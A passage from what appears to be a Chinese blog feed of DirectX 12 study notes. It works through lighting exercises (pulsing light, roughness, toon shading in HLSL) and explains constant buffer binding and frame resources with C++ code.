transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">的</text></g><g data-mml-node="mi" transform="translate(12349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">所</text></g><g data-mml-node="mi" transform="translate(13349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">有</text></g><g data-mml-node="mi" transform="translate(14349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">微</text></g><g data-mml-node="mi" transform="translate(15349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">平</text></g><g data-mml-node="mi" transform="translate(16349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">面</text></g><g data-mml-node="mi" transform="translate(17349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">片</text></g><g data-mml-node="mi" transform="translate(18349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">段</text></g><g data-mml-node="mi" transform="translate(19349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">的</text></g><g data-mml-node="mi" transform="translate(20349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">分</text></g><g data-mml-node="mi" transform="translate(21349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">布</text></g><g data-mml-node="mi" transform="translate(22349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">情</text></g><g data-mml-node="mi" transform="translate(23349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">况</text></g><g data-mml-node="mi" transform="translate(24349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">（</text></g><g data-mml-node="mi" transform="translate(25349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">所</text></g><g data-mml-node="mi" transform="translate(26349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">占</text></g><g data-mml-node="mi" transform="translate(27349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">比</text></g><g data-mml-node="mi" transform="translate(28349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">例</text></g><g data-mml-node="mi" transform="translate(29349.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">）</text></g></g></g><g data-mml-node="mtr" transform="translate(0,-16100)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g><g data-mml-node="mtr" transform="translate(0,-17618.9)"><g data-mml-node="mtd" transform="translate(1708.5,0)"><g data-mml-node="mfrac"><g data-mml-node="mrow" transform="translate(220,398) scale(0.707)"><g data-mml-node="mi"><use data-c="1D45A" xlink:href="#MJX-1-TEX-I-1D45A"></use></g><g data-mml-node="mo" transform="translate(878,0)"><use data-c="2B" xlink:href="#MJX-1-TEX-N-2B"></use></g><g data-mml-node="mn" transform="translate(1656,0)"><use data-c="38" xlink:href="#MJX-1-TEX-N-38"></use></g></g><g data-mml-node="mn" transform="translate(805.5,-345) scale(0.707)"><use data-c="38" xlink:href="#MJX-1-TEX-N-38"></use></g><rect width="1724.5" height="60" x="120" y="220"></rect></g><g data-mml-node="mo" transform="translate(2242.3,0)"><use data-c="3A" xlink:href="#MJX-1-TEX-N-3A"></use></g><g data-mml-node="mstyle" transform="translate(2520.3,0)"><g data-mml-node="mspace"></g></g><g data-mml-node="mi" transform="translate(3798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">镜</text></g><g data-mml-node="mi" transform="translate(4798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">面</text></g><g data-mml-node="mi" transform="translate(5798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">反</text></g><g data-mml-node="mi" transform="translate(6798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">射</text></g><g data-mml-node="mi" transform="translate(7798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">过</text></g><g data-mml-node="mi" transform="translate(8798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">程</text></g><g data-mml-node="mi" transform="translate(9798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">中</text></g><g data-mml-node="mi" transform="translate(10798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">，</text></g><g data-mml-node="mi" transform="translate(11798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">为</text></g><g data-mml-node="mi" transform="translate(12798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">了</text></g><g data-mml-node="mi" transform="translate(13798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">模</text></g><g data-mml-node="mi" transform="translate(14798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">拟</text></g><g data-mml-node="mi" transform="translate(15798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">能</text></g><g data-mml-node="mi" transform="translate(16798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">量</text></g><g data-mml-node="mi" transform="translate(17798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">守</text></g><g data-mml-node="mi" transform="translate(18798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">恒</text></g><g data-mml-node="mi" transform="translate(19798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">所</text></g><g data-mml-node="mi" transform="translate(20798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">采</text></g><g data-mml-node="mi" transform="translate(21798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">用</text></g><g data-mml-node="mi" transform="translate(22798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">的</text></g><g data-mml-node="mi" transform="translate(23798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">归</text></g><g data-mml-node="mi" transform="translate(24798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">一</text></g><g data-mml-node="mi" transform="translate(25798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">化</text></g><g data-mml-node="mi" transform="translate(26798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">因</text></g><g data-mml-node="mi" transform="translate(27798.1,0)"><text data-variant="italic" transform="scale(1,-1)" font-size="884px" font-family="serif" font-style="italic">子</text></g></g></g><g data-mml-node="mtr" transform="translate(0,-19129.5)"><g data-mml-node="mtd" transform="translate(16107.5,0)"></g></g></g></g></g></svg></mjx-container>



<p>在书中的着色器代码中也控制了 n·h 非负</p>
<h2 id="9"><a href="#9" class="headerlink" title="9"></a>9</h2><p>一些名词<br>光泽度（shininess）粒度（granularity）</p>
<h2 id="16-1"><a href="#16-1" class="headerlink" title="16.1"></a>16.1</h2><p>Modify the lighting demo of this chapter so that the directional light only emits mostly red light. In addition, make the strength of the light oscillate as a function of time using the sine function so that the light appears to pulse. Using colored and pulsing lights can be useful for different game moods; for example, a pulsing red light might be used to signify emergency situations</p>
<p>上传前改个常量缓冲区数据，mMainPassCB.Lights[0].Strength &#x3D; { fabsf(sinf(20*gt.TotalTime())), 0.0f, 0.0f };<br><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/GIF-2022-3-17-13-30-23.gif" alt="GIF 2022-3-17 13-30-23"></p>
<h2 id="16-2"><a href="#16-2" class="headerlink" title="16.2"></a>16.2</h2><p>Modify the lighting demo of this chapter by changing the roughness in the materials</p>
<p>调整粗糙度，matConstants.Roughness 修改这个即可，稍微比对一下 1.0f 与 0.0f 的区别</p>
<p>以下有点偷懒，其实是要去改材质的，我直接改了所有的。只对一个修改只需要在 LitColumnsApp::BuildMaterials 中修改即可。</p>
<p>Roughness &#x3D; 0.0f</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220317134809061.png" alt="image-1.0f"></p>
<p>Roughness &#x3D; 1.0f</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220317134844373.png" alt="image-20220317134844373"></p>
<p>这个粗糙度给人感觉有点奇怪。由于 R0 还是挺高的，反射光量也很高，看起来不那么粗糙。</p>
<p>Roughness &#x3D; 1.0f , matConstants.FresnelR0 &#x3D; DirectX::XMFLOAT3(0.0f,0.0f,0.0f);</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220317135252971.png" alt="image-20220317135252971"></p>
<p>这样子确实是粗糙了点，但是不知道为什么走样有点明显。</p>
<h2 id="16-3"><a href="#16-3" class="headerlink" title="16.3"></a>16.3</h2><p>三点布光。具体应该怎么打光应该查一下资料，这里了解一下概念即可。</p>
<h2 id="—"><a href="#—" class="headerlink" title="—"></a>—</h2><p>略</p>
<h2 id="16-6"><a href="#16-6" class="headerlink" title="16.6"></a>16.6</h2><p>One characteristic of cartoon styled lighting is the abrupt transition from one color shade to the next (in contrast with a smooth transition) as shown in Figure 8.30. This can be implemented by computing kd and ks in the usual way, but then transforming them by discrete functions like the following before using them in the pixel shader: Modify the lighting demo of this chapter to use this sort of toon shading. (Note: The functions f and g above are just sample functions to start with, and can be tweaked until you get the results you want.)</p>
<p>卡通风格，书中的例子可以通过修改着色器代码实现，不过添加了分支，不太好。</p>
<p>水流的效果只用了一个直接光，那我就改一下那个看看。</p>
<pre class="line-numbers language-glsl" data-language="glsl"><code class="language-glsl"><span class="token comment">// 如果没有把所有可能包含进去会报错，不是很理解成因</span>
<span class="token keyword">float</span> <span class="token function">kdtrans</span><span class="token punctuation">(</span><span class="token keyword">float</span> kd<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>kd <span class="token operator">&lt;=</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0.4f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>kd <span class="token operator">&lt;=</span> <span class="token number">0.5f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0.6f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>kd <span class="token operator">&lt;=</span> <span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">1.0f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">1.0f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">float</span> <span class="token function">kstrans</span><span class="token punctuation">(</span><span class="token keyword">float</span> ks<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>ks <span class="token operator">&lt;=</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0.0f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ks <span class="token operator">&lt;=</span> <span class="token number">0.1f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0.0f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ks <span class="token operator">&lt;=</span> <span class="token number">0.8f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0.5f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>ks <span class="token operator">&lt;=</span> <span class="token number">1.0f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0.8f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0.8f</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//修改直接光模型</span>
<span class="token keyword">float</span> ndotl <span class="token operator">=</span> <span class="token function">kdtrans</span><span class="token punctuation">(</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token function">dot</span><span class="token punctuation">(</span>lightVec<span class="token punctuation">,</span> normal<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//修改BlinnPhong模型</span>
<span class="token keyword">float</span> roughnessFactor <span class="token operator">=</span> <span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">8.0f</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token function">kstrans</span><span class="token punctuation">(</span><span class="token function">pow</span><span class="token punctuation">(</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token function">dot</span><span class="token punctuation">(</span>halfVec<span class="token punctuation">,</span> normal<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">8.0f</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>没有使用卡通风格</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220317141646375.png" alt="image-20220317141646375"></p>
<p>卡通风格</p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220317142548686.png" alt="image-20220317142548686"></p>
]]></content>
      <categories>
        <category>DX12</category>
      </categories>
      <tags>
        <tag>directX 12</tag>
        <tag>图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>DX12 第七章习题</title>
    <url>/2022/03/16/d3d12-7/</url>
    <content><![CDATA[<h1 id="DX12-7th"><a href="#DX12-7th" class="headerlink" title="DX12-7th"></a>DX12-7th</h1><h2 id="7th-Capture"><a href="#7th-Capture" class="headerlink" title="7th Capture"></a>7th Capture</h2><h3 id="something-before-7"><a href="#something-before-7" class="headerlink" title="something before 7"></a>something before 7</h3><p>记忆被清空了，有点搞不懂 worldViewProj 是怎么产生的了，还有 cb 是怎么绑定的？</p>
<pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">world 就是物体在世界空间的位置
view 是物体从世界空间，变换到摄像机空间（视察空间）的矩阵
Proj 则是物体在视察空间中映射到二维平面上的矩阵<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>constant buffer 的绑定过程，以下是需要绑定的结构体</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 需要绑定的 CB</span>
<span class="token keyword">struct</span> <span class="token class-name">ObjectConstants</span>
<span class="token punctuation">&#123;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT4X4 World <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> <span class="token class-name">PassConstants</span>
<span class="token punctuation">&#123;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT4X4 View <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT4X4 InvView <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT4X4 Proj <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT4X4 InvProj <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT4X4 ViewProj <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT4X4 InvViewProj <span class="token operator">=</span> <span class="token class-name">MathHelper</span><span class="token double-colon punctuation">::</span><span class="token function">Identity4x4</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT3 EyePosW <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> cbPerObjectPad1 <span class="token operator">=</span> <span class="token number">0.0f</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT2 RenderTargetSize <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    DirectX<span class="token double-colon punctuation">::</span>XMFLOAT2 InvRenderTargetSize <span class="token operator">=</span> <span class="token punctuation">&#123;</span> <span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> NearZ <span class="token operator">=</span> <span class="token number">0.0f</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> FarZ <span class="token operator">=</span> <span class="token number">0.0f</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> TotalTime <span class="token operator">=</span> <span class="token number">0.0f</span><span class="token punctuation">;</span>
    <span class="token keyword">float</span> DeltaTime <span class="token operator">=</span> <span class="token number">0.0f</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

cbuffer cbPerObject <span class="token operator">:</span> <span class="token keyword">register</span><span class="token punctuation">(</span>b0<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	float4x4 gWorld<span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

cbuffer cbPass <span class="token operator">:</span> <span class="token keyword">register</span><span class="token punctuation">(</span>b1<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    float4x4 gView<span class="token punctuation">;</span>
    float4x4 gInvView<span class="token punctuation">;</span>
    float4x4 gProj<span class="token punctuation">;</span>
    float4x4 gInvProj<span class="token punctuation">;</span>
    float4x4 gViewProj<span class="token punctuation">;</span>
    float4x4 gInvViewProj<span class="token punctuation">;</span>
    float3 gEyePosW<span class="token punctuation">;</span>
    <span class="token keyword">float</span> cbPerObjectPad1<span class="token punctuation">;</span>
    float2 gRenderTargetSize<span class="token punctuation">;</span>
    float2 gInvRenderTargetSize<span class="token punctuation">;</span>
    <span class="token keyword">float</span> gNearZ<span class="token punctuation">;</span>
    <span class="token keyword">float</span> gFarZ<span class="token punctuation">;</span>
    <span class="token keyword">float</span> gTotalTime<span class="token punctuation">;</span>
    <span class="token keyword">float</span> gDeltaTime<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">FrameResource</span>
<span class="token punctuation">&#123;</span>
<span class="token keyword">public</span><span class="token operator">:</span>
    
    <span class="token function">FrameResource</span><span class="token punctuation">(</span>ID3D12Device<span class="token operator">*</span> device<span class="token punctuation">,</span> UINT passCount<span class="token punctuation">,</span> UINT objectCount<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">FrameResource</span><span class="token punctuation">(</span><span class="token keyword">const</span> FrameResource<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">delete</span><span class="token punctuation">;</span>
    FrameResource<span class="token operator">&amp;</span> <span class="token keyword">operator</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword">const</span> FrameResource<span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token keyword">delete</span><span class="token punctuation">;</span>
    <span class="token operator">~</span><span class="token function">FrameResource</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// We cannot reset the allocator until the GPU is done processing the commands.</span>
    <span class="token comment">// So each frame needs their own allocator.</span>
    Microsoft<span class="token double-colon punctuation">::</span>WRL<span class="token double-colon punctuation">::</span>ComPtr<span class="token operator">&lt;</span>ID3D12CommandAllocator<span class="token operator">></span> CmdListAlloc<span class="token punctuation">;</span>

    <span class="token comment">// We cannot update a cbuffer until the GPU is done processing the commands</span>
    <span class="token comment">// that reference it.  So each frame needs their own cbuffers.</span>
    std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>UploadBuffer<span class="token operator">&lt;</span>PassConstants<span class="token operator">>></span> PassCB <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>
    std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>UploadBuffer<span class="token operator">&lt;</span>ObjectConstants<span class="token operator">>></span> ObjectCB <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>

    <span class="token comment">// Fence value to mark commands up to this fence point.  This lets us</span>
    <span class="token comment">// check if these frame resources are still in use by the GPU.</span>
    UINT64 Fence <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/*
第一步:创建根签名，把一个含有 cbv 的描述符表 绑定到常量缓冲区寄存器 0，总感觉这个绑定过程有冗余
*/</span>
<span class="token keyword">void</span> <span class="token class-name">ShapesApp</span><span class="token double-colon punctuation">::</span><span class="token function">BuildRootSignature</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    CD3DX12_DESCRIPTOR_RANGE cbvTable0<span class="token punctuation">;</span>
	cbvTable0<span class="token punctuation">.</span><span class="token function">Init</span><span class="token punctuation">(</span>D3D12_DESCRIPTOR_RANGE_TYPE_CBV<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//...</span>
    <span class="token comment">// Create root CBVs.</span>
    slotRootParameter<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">InitAsDescriptorTable</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>cbvTable0<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//...</span>
    HRESULT hr <span class="token operator">=</span> <span class="token function">D3D12SerializeRootSignature</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>rootSigDesc<span class="token punctuation">,</span> D3D_ROOT_SIGNATURE_VERSION_1<span class="token punctuation">,</span>
		serializedRootSig<span class="token punctuation">.</span><span class="token function">GetAddressOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> errorBlob<span class="token punctuation">.</span><span class="token function">GetAddressOf</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//...</span>
    md3dDevice<span class="token operator">-></span><span class="token function">CreateRootSignature</span><span class="token punctuation">(</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">//...</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">/*
第二步：创建了帧资源，在帧资源中存储着 PassCB，ObjectCB 的指针
简单初始化了 mFrameResources 
*/</span>
<span class="token keyword">void</span> <span class="token class-name">ShapesApp</span><span class="token double-colon punctuation">::</span><span class="token function">BuildFrameResources</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> gNumFrameResources<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        mFrameResources<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>FrameResource<span class="token operator">></span></span></span><span class="token punctuation">(</span>md3dDevice<span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            <span class="token number">1</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>UINT<span class="token punctuation">)</span>mAllRitems<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">/*
第三步：创建了堆描述符，为了将常量缓冲区绑定到渲染流水线上，但是此时还没有绑定
创建了 mCbvHeap，以及一些数据 mPassCbvOffset
*/</span>
<span class="token keyword">void</span> <span class="token class-name">ShapesApp</span><span class="token double-colon punctuation">::</span><span class="token function">BuildDescriptorHeaps</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    UINT objCount <span class="token operator">=</span> <span class="token punctuation">(</span>UINT<span class="token punctuation">)</span>mOpaqueRitems<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">// Need a CBV descriptor for each object for each frame resource,</span>
    <span class="token comment">// +1 for the perPass CBV for each frame resource.</span>
    UINT numDescriptors <span class="token operator">=</span> <span class="token punctuation">(</span>objCount<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> gNumFrameResources<span class="token punctuation">;</span>

    <span class="token comment">// Save an offset to the start of the pass CBVs.  These are the last 3 descriptors.</span>
    mPassCbvOffset <span class="token operator">=</span> objCount <span class="token operator">*</span> gNumFrameResources<span class="token punctuation">;</span>

    D3D12_DESCRIPTOR_HEAP_DESC cbvHeapDesc<span class="token punctuation">;</span>
    cbvHeapDesc<span class="token punctuation">.</span>NumDescriptors <span class="token operator">=</span> numDescriptors<span class="token punctuation">;</span>
    cbvHeapDesc<span class="token punctuation">.</span>Type <span class="token operator">=</span> D3D12_DESCRIPTOR_HEAP_TYPE_CBV_SRV_UAV<span class="token punctuation">;</span>
